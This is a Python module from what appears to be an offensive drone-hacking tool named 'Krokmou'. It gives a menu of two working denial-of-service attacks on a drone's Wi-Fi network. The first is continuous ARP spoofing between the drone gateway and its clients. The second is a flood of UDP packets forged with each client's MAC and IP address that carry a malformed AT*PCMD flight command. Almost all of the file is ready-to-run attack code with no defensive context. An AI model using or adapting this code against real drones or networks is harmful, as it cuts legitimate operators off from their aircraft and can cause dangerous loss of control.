from scapy.all import *
from scan_clients import *
from time import sleep

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m'

gateway_ip = "192.168.1.1"
srcPort = 5556
dstPort = 5556

def menu():
    os.system("clear")

    print('\n{}Choose your DOS attack: \n'.format(GREEN))
    print('\t{}1{} - ARP Spoofing DOS !'.format(RED, GREEN))
    print('\t{}2{} - Commands DOS'.format(RED,GREEN))
    print('\n\t{}R{} - Return\n'.format(RED,GREEN))

def arp_dos(list_of_client, gateway_mac, iface):
    while True:
        os.system("clear")
        print('\n{}ARP Spoofing DOS running... \n'.format(GREEN))
        for client in list_of_client:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=client.ip))
            send(ARP(op=2, pdst=client.ip, hwdst=client.mac, psrc=gateway_ip))
            sleep(2)

def command_dos(list_of_client, gateway_mac, iface):
    payload = "AT*PCMD="+str(10000000000)+",0,0,0,0,0\r"
    while True:
        os.system("clear")
        print('\n{}Commands DOS running... \n'.format(GREEN))
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=gateway_mac) / IP(src=client.ip, dst=gateway_ip) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
            sleep(0.3)

def dos_main(drone, iface):
    gateway_mac = drone.bssid
    list_of_client = scanNetwork("192.168.1.2-10")  #return list of Class Object clients connected to the drone. Client define in scan_clients
    if len(list_of_client) >= 1:
        while True:
            menu()
            header = '{}Krokmou{} > '.format(GREEN,WHITE)
            choice = input(header)
            if choice.upper() == 'R' or choice.upper() == 'RETURN':
                break
            elif choice == '1':
                arp_dos(list_of_client, gateway_mac, iface)
            elif choice == '2':
                command_dos(list_of_client, gateway_mac, iface)
    else:
        print('\n{}Wait{}: Krokmou has no master. No DOS possible.\n'.format(RED,GREEN))
        print("\n{}Press ENTER to return to main menu...".format(GREEN))
        enter = input()
        os.system("clear")
